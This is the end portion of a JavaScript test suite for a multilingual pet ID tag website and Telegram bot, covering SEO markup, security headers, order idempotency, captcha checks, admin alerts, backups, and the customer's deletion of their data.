    assert.equal(noTime(I18N[L].bub1), noTime(b1), L + ' bub1');
    assert.ok(noTime(I18N[L].bub2).startsWith(noTime(_test.tr(L, 'locHead', { pet: NAME[L], time: time(33), acc: 12 }).replace(/\n+$/, '').replace(/\n/g, '<br>'))), L + ' bub2');
    assert.ok(I18N[L].bub2.includes(_test.tr(L, 'maps')));
  }
  assert.ok(home.includes(I18N.en.bub1) && home.includes(I18N.en.bub2), 'HTML default = EN bot text');
});

// ---- Стадия 2: поиск (SEO) ----
await test('SEO: /he/ and /ru/ are translated HTML with their own title, canonical, hreflang, OG and JSON-LD; prices without JS', async () => {
  const e = makeEnv({ SITE_URL: 'https://findy-pet.com' });
  const pages = {};
  for (const [l, path] of [['en', '/'], ['he', '/he/'], ['ru', '/ru/']]) {
    const r = await call(e, path);
    assert.equal(r.status, 200, path);
    const html = await r.text(); pages[l] = html;
    assert.match(html, new RegExp(`<link rel="canonical" href="https://findy-pet.com${path}">`));
    for (const [hl, hp] of [['en', '/'], ['he', '/he/'], ['ru', '/ru/'], ['x-default', '/']]) {
      assert.match(html, new RegExp(`<link rel="alternate" hreflang="${hl}" href="https://findy-pet.com${hp}">`), `${path} hreflang ${hl}`);
    }
    assert.match(html, /<meta property="og:image" content="https:\/\/findy-pet\.com\/assets\/og\.jpg">/);
    assert.match(html, /data-price="tag">49 ₪</); assert.match(html, /data-price="bundle">147 ₪</);
    const ld = JSON.parse(html.match(/<script[^>]*type="application\/ld\+json">(.*?)<\/script>/s)[1]);
    const byType = Object.fromEntries(ld['@graph'].map((n) => [n['@type'], n]));
    assert.deepEqual(byType.Product.offers.map((o) => [o.price, o.priceCurrency]), [['49', 'ILS'], ['147', 'ILS']]);
    assert.ok(byType.FAQPage.mainEntity.length >= 14);
    assert.ok(!/delivery|משלוח|доставк/i.test(JSON.stringify(byType.Product)), 'no delivery terms in Product');
  }
  assert.match(pages.he, /<html lang="he" dir="rtl" data-lang="he">/); assert.match(pages.ru, /<html lang="ru" dir="ltr" data-lang="ru">/);
  assert.match(pages.he, /<h1 data-t="heroTitle">חיית המחמד אבדה\?/); assert.match(pages.ru, /<h1 data-t="heroTitle">Питомец потерялся\?/);
  assert.match(pages.he, /<title>FindYpet — /); assert.match(pages.he, /<meta name="description" content="תג זיהוי זוהר בחושך/);
  assert.match(pages.he, /href="\/css\/style\.css\?v=\d+"/); assert.match(pages.he, /src="\/js\/i18n\.js\?v=\d+"/);
  assert.match(pages.he, /href="\/privacy\/\?lang=he"/); assert.doesNotMatch(pages.he, /(href|src)="(css|js|assets)\//);
  assert.match(pages.he, /aria-label="תג FindYpet על קולר/);
  assert.match(pages.en, /<html lang="en" dir="ltr" data-lang="en">/); assert.match(pages.en, /fastest way home/);
  assert.equal((await call(e, '/he')).status, 301);
  const og = await call(e, '/assets/og.jpg');
  assert.equal(og.status, 200); assert.equal(og.headers.get('Content-Type'), 'image/jpeg');
});

await test('SEO: robots.txt and sitemap.xml on the live site; tag pages and posters are noindex', async () => {
  const e = makeEnv({ SITE_URL: 'https://findy-pet.com' });
  const robots = await (await call(e, '/robots.txt')).text();
  assert.match(robots, /^User-agent: \*\nAllow: \//); assert.match(robots, /Disallow: \/api\//);
  assert.doesNotMatch(robots, /Disallow: \/t\//); // иначе поисковик не увидит noindex
  assert.match(robots, /Sitemap: https:\/\/findy-pet\.com\/sitemap\.xml/);
  const sm = await (await call(e, '/sitemap.xml')).text();
  for (const u of ['https://findy-pet.com/', 'https://findy-pet.com/he/', 'https://findy-pet.com/ru/', 'https://findy-pet.com/privacy/']) assert.ok(sm.includes(`<loc>${u}</loc>`), u);
  assert.match(sm, /hreflang="he" href="https:\/\/findy-pet\.com\/he\/"/);
  assert.equal((await call(e, '/t/101')).headers.get('X-Robots-Tag'), 'noindex, nofollow');
  assert.equal((await call(e, '/tag/?id=101')).headers.get('X-Robots-Tag'), 'noindex, nofollow');
  assert.equal((await call(e, '/he/')).headers.get('X-Robots-Tag'), null);
});

// ---- Стадия 2: безопасность и надёжность ----
await test('security headers: CSP with a nonce on every inline script; nosniff everywhere; no CSP on JSON', async () => {
  for (const path of ['/', '/he/', '/t/101', '/privacy/']) {
    const r = await call(env, path);
    const pol = r.headers.get('Content-Security-Policy');
    assert.ok(pol, path + ' has CSP');
    const nonce = /'nonce-([^']+)'/.exec(pol)[1];
    assert.match(pol, /frame-ancestors 'none'/); assert.match(pol, /object-src 'none'/);
    assert.equal(r.headers.get('X-Content-Type-Options'), 'nosniff');
    assert.equal(r.headers.get('X-Frame-Options'), 'DENY');
    const html = await r.text();
    const inline = [...html.matchAll(/<script(?![^>]*\bsrc=)([^>]*)>/g)].map((m) => m[1]);
    assert.ok(inline.every((a) => a.includes(`nonce="${nonce}"`)), path + ': every inline script has the nonce');
  }
  const a = await call(env, `/p/${tagId}`);
  assert.match(a.headers.get('Content-Security-Policy'), /nonce-/);
  const j = await call(env, `/api/tag?id=${tagId}`);
  assert.equal(j.headers.get('Content-Security-Policy'), null); assert.equal(j.headers.get('X-Content-Type-Options'), 'nosniff');
  const n1 = /'nonce-([^']+)'/.exec((await call(env, '/')).headers.get('Content-Security-Policy'))[1];
  const n2 = /'nonce-([^']+)'/.exec((await call(env, '/')).headers.get('Content-Security-Policy'))[1];
  assert.notEqual(n1, n2, 'nonce is new for every response');
});

await test('activation link works once: another Telegram account is refused, admin is told; the owner can reopen it', async () => {
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Tal', phone: '050-888-1122', pet_name: 'Kofi', address: 'Haifa', consent: true, lang: 'en', tags: 2, pets: ['Mocha'] } })).json();
  const tok = d.telegram_link.split('start=')[1];
  await tgUpdate(env, msg('7201', '/start ' + tok));
  assert.match(state.tg.filter((c) => c.payload.chat_id === '7201').at(-2).payload.text, /you are registered/);
  // второй жетон того же заказа тоже закрыт: его токен из order.tokens
  const o = await KV.get(`o:${d.order_id}`, 'json');
  for (const t of Object.values(o.tokens)) assert.equal(await KV.get(`tok:${t}`), '7201');
  await tgUpdate(env, msg('7666', '/start ' + tok));
  assert.match(lastTg('sendMessage').payload.text, /already been used by another Telegram account/);
  assert.ok(state.tags.filter((t) => t.link_token === tok).every((t) => t.telegram_chat_id === '7201'), 'not relinked');
  assert.match(state.tg.filter((c) => c.payload.chat_id === 'admin').at(-1).payload.text, /opened by another Telegram chat \(7666\) — refused/);
  await tgUpdate(env, msg('7201', '/start ' + tok));
  assert.match(state.tg.filter((c) => c.payload.chat_id === '7201').at(-2).payload.text, /you are registered/);
});

await test('site order: the same idempotency key never creates a second order; Turnstile is checked when switched on', async () => {
  const body = { owner_name: 'Idem', phone: '050-999-0001', pet_name: 'Once', address: 'Haifa', consent: true, idem: 'idem-key-12345' };
  const n = state.tags.length;
  const a = await (await call(env, '/api/register', { method: 'POST', body })).json();
  const b = await (await call(env, '/api/register', { method: 'POST', body })).json();
  assert.equal(a.success, true); assert.equal(b.order_id, a.order_id);
  assert.equal(state.tags.length, n + 1);
  const tsEnv = makeEnv({ TURNSTILE_SECRET: 'ts-secret', TURNSTILE_SITE_KEY: '0x4AAAAAAA-site' });
  let r = await call(tsEnv, '/api/register', { method: 'POST', body: { ...body, idem: undefined } });
  assert.equal(r.status, 403); assert.equal((await r.json()).error_code, 'captcha');
  r = await call(tsEnv, '/api/register', { method: 'POST', body: { ...body, idem: undefined, ts: 'bad' } });
  assert.equal(r.status, 403);
  r = await call(tsEnv, '/api/register', { method: 'POST', body: { ...body, idem: undefined, ts: 'good-token' } });
  assert.equal((await r.json()).success, true);
  assert.match(await (await call(tsEnv, '/js/plans.js')).text(), /const TURNSTILE_SITE_KEY = "0x4AAAAAAA-site";/);
  assert.match((await (await call(tsEnv, '/setup?key=sec')).json()).turnstile, /^on ✅/);
  const badEnv = makeEnv({ TURNSTILE_SECRET: 'wrong', TURNSTILE_SITE_KEY: '0x4AAAAAAA-site' });
  assert.match((await (await call(badEnv, '/setup?key=sec')).json()).turnstile, /secret is wrong/i);
  assert.match((await (await call(env, '/setup?key=sec')).json()).turnstile, /^off/);
  assert.doesNotMatch(await (await call(env, '/js/plans.js')).text(), /TURNSTILE/);
});

await test('failures reach the admin: order the table refused; finder who could not reach the owner', async () => {
  state.gasDown = true;
  const r = await call(env, '/api/register', { method: 'POST', body: { owner_name: 'Down', phone: '050-999-0002', pet_name: 'Nope', address: 'Haifa', consent: true } });
  state.gasDown = false;
  assert.equal(r.status, 502);
  assert.match(state.tg.filter((c) => c.payload.chat_id === 'admin').at(-1).payload.text, /Site order FAILED[\s\S]*Down · 📱 \+972 50-999-0002/);
  const d = await (await call(env, '/api/register', { method: 'POST', body: { owner_name: 'Blk', phone: '050-999-0003', pet_name: 'Ghost', address: 'Haifa', consent: true } })).json();
  state.tags.find((t) => t.tag_id === String(d.id_tag)).telegram_chat_id = 'blocked';
  await call(env, '/api/found', { method: 'POST', body: { id_tag: d.id_tag, lat: 32.8, lon: 35 } });
  const alert = state.tg.filter((c) => c.payload.chat_id === 'admin').at(-1).payload.text;
  assert.match(alert, /Finder could not reach the owner/); assert.match(alert, /\+972 50-999-0003/); assert.match(alert, /maps\.google\.com/);
  const n = state.tg.length;
  await call(env, '/api/found', { method: 'POST', body: { id_tag: d.id_tag } });
  assert.ok(!state.tg.slice(n).some((c) => c.payload.chat_id === 'admin'), 'no second alert within 10 minutes');
});

await test('test site /setup refuses the production bot token', async () => {
  const tenv = { STAGE: 'test', TEST_DB: '1', SITE_URL: 'https://test.findy-pet.com', BOT_TOKEN: 'T', WEBHOOK_SECRET: 'sec', FYP_KV: makeKV() };
  state.botUsername = 'YourPetLocatorBot';
  const n = state.tg.length;
  const r = await call(tenv, '/setup?key=sec');
  state.botUsername = undefined;
  assert.equal(r.status, 409); assert.match((await r.json()).error, /PRODUCTION bot token/);
  assert.ok(!state.tg.slice(n).some((c) => c.method === 'setWebhook'));
  assert.equal((await call(tenv, '/setup?key=sec')).status, 200);
});

await test('daily backup: KV data goes to the admin as a JSON file', async () => {
  const n = state.tg.length;
  const pending = [];
  await worker.scheduled({}, env, { waitUntil: (p) => pending.push(p) });
  await Promise.all(pending);
  const doc = state.tg.slice(n).find((c) => c.method === 'sendDocument');
  assert.ok(doc, 'sendDocument called');
  assert.equal(doc.payload.chat_id, 'admin');
  const data = JSON.parse(await doc.payload.document.text());
  assert.ok(Object.keys(data.data).some((k) => k.startsWith('o:FY')));
  assert.ok(Object.keys(data.data).some((k) => k.startsWith('x:')));
  assert.ok(!Object.keys(data.data).some((k) => k.startsWith('img:') || k.startsWith('c:')));
  assert.match(doc.payload.document.name, /^findypet-backup-\d{4}-\d{2}-\d{2}\.json$/);
});

// ---- Стадия 2: удаление данных, крышки для печати, версия Apps Script ----
await test('/delete: owner erases the tag data (table + KV + order), page shows nothing, scans are silent; admin is told', async () => {
  const C = '7301';
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Del Me', phone: '050-121-2121', pet_name: 'Gone', address: 'Haifa, Secret 5', consent: true, lang: 'ru', notes: 'shy' } })).json();
  await tgUpdate(env, msg(C, '/start ' + d.telegram_link.split('start=')[1]));
  await KV.put(`img:${d.id_tag}`, new Uint8Array([0xff, 0xd8, 0xff]).buffer, { metadata: { type: 'image/jpeg', v: 'x1' } });
  await tgUpdate(env, msg(C, '/delete'));
  const ask = lastTg('sendMessage').payload;
  assert.match(ask.text, /Удалить данные питомца Gone\?/);
  assert.deepEqual(ask.reply_markup.inline_keyboard[0].map((b) => b.callback_data), [`delok:${d.id_tag}`, 'delno']);
  await tgUpdate(env, cb('7666', `delok:${d.id_tag}`)); // чужой чат — не может
  assert.match(lastTg('sendMessage').payload.text, /not linked to your Telegram/);
  await tgUpdate(env, cb(C, 'delno'));
  assert.match(lastTg('sendMessage').payload.text, /ничего не удалено/);
  await tgUpdate(env, cb(C, `delok:${d.id_tag}`));
  const row = state.tags.find((t) => t.tag_id === String(d.id_tag));
  assert.equal(row.status, 'deleted'); assert.equal(row.phone, ''); assert.equal(row.address, '');
  for (const k of ['x:', 'c:', 'img:']) assert.equal(await KV.get(k + d.id_tag), null, k);
  const o = await KV.get(`o:${d.order_id}`, 'json');
  assert.equal(o.phone, ''); assert.equal(o.address, ''); assert.ok(o.items[0].deleted);
  assert.equal(await KV.get(`chat:${C}`), null);
  assert.match(state.tg.filter((c) => c.payload.chat_id === C).at(-1).payload.text, /данные питомца Gone удалены/);
  assert.match(state.tg.filter((c) => c.payload.chat_id === 'admin').at(-1).payload.text, /Customer deleted the data of #\d+ \(order FY\d+\)/);
  assert.equal((await (await call(env, `/api/tag?id=${d.id_tag}`)).json()).found, false);
  const n = state.tg.length;
  await new Promise((r) => setTimeout(r, 1100));
  assert.equal((await (await call(env, '/api/scan', { method: 'POST', body: { id_tag: d.id_tag } })).json()).success, false);
  assert.equal(state.tg.length, n);
  assert.equal((await call(env, `/p/${d.id_tag}`)).status, 404);
});

await test('/delete with the old Apps Script: the customer is told it will be done by hand, the admin gets the request', async () => {
  const C = '7302';
  const d = await (await call(env, '/api/register', { method: 'POST', body: { owner_name: 'Old', phone: '050-121-3131', pet_name: 'Keep', address: 'Haifa', consent: true } })).json();
  await tgUpdate(env, msg(C, '/start ' + d.telegram_link.split('start=')[1]));
  state.oldGas = true;
  await tgUpdate(env, cb(C, `delok:${d.id_tag}`));
  const v = await (await call(env, '/setup?key=sec')).json();
  state.oldGas = false;
  assert.match(state.tg.filter((c) => c.payload.chat_id === C).at(-1).payload.text, /finished by hand/);
  assert.match(state.tg.filter((c) => c.payload.chat_id === 'admin').at(-1).payload.text, /Delete request<\/b> for #\d+/);
  assert.notEqual(state.tags.find((t) => t.tag_id === String(d.id_tag)).status, 'deleted');
  assert.match(v.db_version, /v1 — update it/);
  assert.match((await (await call(env, '/setup?key=sec')).json()).db_version, /Apps Script v2/);
});

await test('/plate: admin gets orders.csv of lids for paid orders (spares repeated); others get nothing', async () => {
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Plate', phone: '050-131-4141', pet_name: 'Lulu', address: 'Haifa', consent: true, tags: 2 } })).json();
  await tgUpdate(env, cb('admin', `ord:${d.order_id}:paid`));
  const n = state.tg.length;
  await tgUpdate(env, msg('7303', '/plate'));
  assert.ok(!state.tg.slice(n).some((c) => c.method === 'sendDocument'));
  await tgUpdate(env, msg('admin', '/plate'));
  const doc = state.tg.slice(n).find((c) => c.method === 'sendDocument');
  const csv = await doc.payload.document.text();
  assert.match(csv, /^id,name,phone\n/);
  assert.equal(csv.split('\n').filter((l) => l === `${d.id_tag},LULU,050-131-4141`).length, 2);
  assert.equal(doc.payload.document.name, 'orders.csv');
});

await test('legal: accessibility statement in 3 languages, linked from the site, tag page and privacy; privacy has retention, /delete, consent for the 2nd phone', async () => {
  const a = await call(env, '/accessibility/');
  assert.equal(a.status, 200);
  const html = await a.text();
  for (const s of ['Accessibility statement', 'הצהרת נגישות', 'Заявление о доступности', 'IS 5568', 'WCAG 2.1']) assert.ok(html.includes(s), s);
  const priv = await (await call(env, '/privacy/')).text();
  for (const s of ['How long we keep data', 'כמה זמן אנחנו שומרים מידע', 'Как долго мы храним данные', '/delete', "only with that person's consent", '../accessibility/?lang=he']) assert.ok(priv.includes(s), s);
  assert.match(await (await call(env, '/')).text(), /<a href="accessibility\/" data-t="a11yLink">/);
  assert.match(await (await call(env, '/he/')).text(), /<a href="\/accessibility\/\?lang=he" data-t="a11yLink">הצהרת נגישות<\/a>/);
  assert.match(await (await call(env, '/t/101')).text(), /<a href="\.\.\/accessibility\/" data-t="a11y">/);
  assert.match(await (await call(env, '/sitemap.xml')).text(), /<loc>http:\/\/localhost:8787\/accessibility\/<\/loc>/);
});

console.log(`\n${passed} tests passed`);
